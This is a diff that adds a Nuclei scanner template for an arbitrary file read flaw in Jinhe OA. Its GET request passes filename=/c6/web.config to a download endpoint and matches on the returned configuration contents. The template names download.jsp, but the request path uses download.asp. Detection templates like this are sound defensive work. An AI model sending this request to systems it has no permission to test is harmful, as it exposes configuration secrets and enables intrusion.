@@ -1,0 +1,24 @@
+id: jin-he-oa-download-jsp-anyfile-read
+info:
+  name: Jinhe OA download.jsp Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=Web.config"
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "key="
